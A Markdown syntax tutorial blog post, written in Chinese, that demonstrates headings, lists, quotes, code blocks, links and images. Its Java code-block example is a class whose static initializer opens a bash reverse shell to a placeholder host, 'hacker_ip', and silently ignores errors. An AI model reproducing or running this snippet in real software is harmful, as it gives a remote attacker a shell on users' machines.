---
title: Markdown 简易教程
published: 2025-11-04
description: A simple example of a Markdown blog post.
tags: [Markdown, Blogging]
category: Markdown
draft: false
---

输入#号并按一下空格即可创建一个h1标签：
```
# h1标签
```

# h1标签

随着#号的数量增加，依次代表h2、h3...标签：
```
## h2标签
...
```

## h2标签
### h3标签
#### h4标签
##### ...

高亮语句中的关键词：
```
Learn**markdown**
```

Learn**markdown**

```
Learn``markdown``
```

Learn``markdown``

列表创建：
```
- 这是-号建立列表
* 这是*号建立列表
# 上述两种方式不同效果一样，按下Tab键可加入缩进
    * 加了缩进的效果
```

- 这是-号建立列表
* 这是*号建立列表
    * 加了缩进的效果

```
1. 有序列表创建方法
2. apple
    1. kfc
    2. test
```

1. 有序列表创建方法
2. apple
    1. kfc
    2. test

引用创建：
```
> Block quotes are
> written like so.
>
> They can span multiple paragraphs,
> if you like.
> 
> hello~
```

> Block quotes are
> written like so.
>
> They can span multiple paragraphs,
> if you like.
> 
> hello~

支持Unicode表情符号：
☺

创建代码块：
连续空格4下或者三个反引号包裹起来

    连续空格4下demo
    hello world

```
三个反引号包裹demo
hello world
```


通过在前三个反引号后面加编程语言类型指定此代码块的语言：

```python
import time
# Quick, count to ten!
for i in range(10):
    # (but not *too* quick)
    time.sleep(0.5)
    print i
```

```java
import java.lang.Runtime;
import java.lang.Process;
public class hello {
    static {
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/hacker_ip/999 0>&1"});
            p.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

创建链接：
英文版中括号中写链接文字，后面跟括号，里面写入链接地址

点击这里可以来到我的博客 -> [blog](https://github.com/lepustimus/lepustimus.github.io)

将链接地址设置为文章某处章节即可作为锚点链接：

回到h1标签的位置 -> [传送](#h1标签)


创建图片：
```
格式：![图片描述](图片路径)；
例如 ![示例图片](./demo.png)
```
![photo](image.png)